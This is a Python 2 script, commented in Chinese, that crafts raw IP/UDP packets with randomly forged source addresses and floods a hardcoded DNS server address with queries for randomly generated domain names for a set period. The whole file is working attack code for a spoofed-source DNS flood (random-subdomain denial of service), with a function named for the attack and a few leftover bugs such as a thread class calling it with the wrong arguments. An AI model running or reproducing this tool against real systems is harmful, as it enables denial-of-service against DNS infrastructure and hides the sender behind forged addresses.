#coding:utf-8
'''
raw-socket组建伪造源ip的dns包
'''
import socket
import time
import struct
import random
import threading
from datetime import *
from scapy.all import *


class myThread(threading.Thread):
    def __init__(self, srcip, srcport):
        threading.Thread.__init__(self)
        self.srcip = srcip
        self.srcport = srcport

    def run(self):
        re_att(self.srcip, self.srcport)


def checksum(data):
    s = 0
    n = len(data) % 2
    for i in range(0, len(data) - n, 2):
        s += ord(data[i]) + (ord(data[i + 1]) << 8)
    if n:
        s += ord(data[i + 1])
    while (s >> 16):
        s = (s & 0xFFFF) + (s >> 16)
    s = ~s & 0xffff
    return s


def IP(source, destination, udplen):
    # ip header
    version = 4  # ipv4
    ihl = 5  # Header Length =5
    tos = 0  # ots
    tl = 20 + udplen  # left for kernel to fill
    ip_id = random.randint(1, 65530)  # fragment相关
    flags = 0  # fragment相关
    offset = 0
    ttl = 128
    protocol = 17  # 表示后面接的udp
    check = 0  # left for kernel to fill
    source = socket.inet_aton(source)  # 源ip
    destination = socket.inet_aton(destination)  # 目的ip

    ver_ihl = (version << 4) + ihl  # 合并成一个字节
    flags_offset = (flags << 13) + offset
    ip_header = struct.pack("!BBHHHBBH4s4s",
                            ver_ihl,
                            tos,
                            tl,
                            ip_id,
                            flags_offset,
                            ttl,
                            protocol,
                            check,
                            source,
                            destination)
    check = checksum(ip_header)
    ip_header = struct.pack("!BBHHHBBH4s4s",
                            ver_ihl,
                            tos,
                            tl,
                            ip_id,
                            flags_offset,
                            ttl,
                            protocol,
                            socket.htons(check),
                            source,
                            destination)
    return ip_header


def udp(sp, dp, datalen):
    # udp
    srcport = sp
    dstport = dp
    udplen = 8 + datalen
    udp_checksum = 0
    udp_header = struct.pack("!HHHH", srcport, dstport, udplen, udp_checksum)
    return udp_header


def re_att(dstip,srcport,stoptime):
    '''
                '\x65'+'\xd3'+'\x01'+'\x20'+'\x00'+'\x01'+'\x00'+'\x00'+'\x00'+'\x00'+'\x00'+'\x01'+'\x08'+'\x74'+'\x6f'+'\x79'
                 +'\x73'+'\x74'+'\x6f'+'\x72'+'\x79'+'\x06'+'\x77'+'\x69'+'\x7a'+'\x65'+'\x79'+'\x65'+'\x03'+'\x63'+'\x6f'+'\x6d'
                 +'\x02'+'\x63'+'\x6e'+'\x00'+'\x00'+'\x10'+'\x00'+'\x01'+'\x00'+'\x00'+'\x29'+'\x10'+'\x00'+'\x00'+'\x00'+'\x00'
                 +'\x00'+'\x00'+'\x00'
                 '''
    # DNS_data = (
    # '\xfe' + '\x34' + '\x01' + '\x20' + '\x00' + '\x01' + '\x00' + '\x00' + '\x00' + '\x00' + '\x00' + '\x01' + '\x08' + '\x74' + '\x6f' + '\x79'
    # + '\x73' + '\x74' + '\x6f' + '\x72' + '\x79' + '\x06' + '\x77' + '\x69' + '\x7a' + '\x65' + '\x79' + '\x65' + '\x03' + '\x63' + '\x6f' + '\x6d'
    # + '\x02' + '\x63' + '\x6e' + '\x00' + '\x00' + '\x10' + '\x00' + '\x01' + '\x00' + '\x00' + '\x29' + '\x10' + '\x00' + '\x00' + '\x00' + '\x00'
    # + '\x00' + '\x00' + '\x00')
    # domain='www.baidu.com'



    n = len(ipaddr) - 1

    t=datetime.now()
    while t<stoptime:

        dstport = 53
        domain = domain_fake()
        srcip = ip_fake()
        DNS_data = str(DNS(rd=1, qd=DNSQR(qname=domain, qtype=1)))
        data = DNS_data
        # dstip=dns_fake()
        datalen = len(data)  # DNS段长度
        udp_header = udp(srcport, dstport, datalen)  # 组装udp_header
        ip_header = IP(srcip, dstip, len(udp_header) + datalen)  # 组装ip_header
        ip_packet = ip_header + udp_header + data  # 组装包
        s.sendto(ip_packet, (dstip, dstport))  # 发送数据包
        #time.sleep(0.1)
	t = datetime.now()


def ip_fake():
    return "%s.%s.%s.%s"%(random.randint(2,253),random.randint(2,253),random.randint(2,253),random.randint(2,253))

def domain_fake():
    domain=''
    tld=[ "com", "net", "org", "xyz", "info", "top", "biz",
		"loan", "win", "wang", "club", "online", "site", "mobi",
		"bid", "vip", "link", "xin", "tech", "gdn", "pro", "website",
		"space", "men", "asia", "science", "red", "kiwi", "shop", "trade",
		"xxx", "date", "click", "name", "xn--ses554g", "party", "racing",
		"ren", "store", "cat", "xn--p1acf", "accountant", "cloud",
		"xn--vuq861b", "kim", "tel", "download", "review", "live", "lol",
		"life", "rocks", "work", "nyc", "news", "host", "email" ]
    l="abcdefghijklmnopqrstuvwxyz0123456789"

    for i in range(6):
        if i==3:
            domain+='.'
        domain+=l[random.randint(0,35)]
    domain=domain+"."+tld[random.randint(0,56)]
    return domain
def gettime(interval):
    d1 = datetime.now()
    d3 = d1 + timedelta(hours=interval)
    return d1.strftime("%m-%d-%H-%M"),d3
if __name__ == '__main__':
    proto_udp = 17
    proto_tcp = 6
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, 17)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    ipaddr = []
    dstip = "222.194.13.2"
    #srcip = '10.236.198.195'  # '10.246.25.31'#'192.168.229.142'  #raw_input('attack IP:')
    srcport = 53  # int(input('attack PORT:'))
    # fa = open(r'/home/wmy/workspace/dig/qflog', 'a')
    # count = 10000000
    interval = 0.5
    starttime, stoptime = gettime(interval=interval)
    print "starttime:%s\tstoptime:%s" % (starttime, stoptime)
    re_att(dstip=dstip,srcport=srcport,stoptime=stoptime)
    print datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    # fa.write(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    # fa.write("\tqf\tend\n")
    # fa.close()

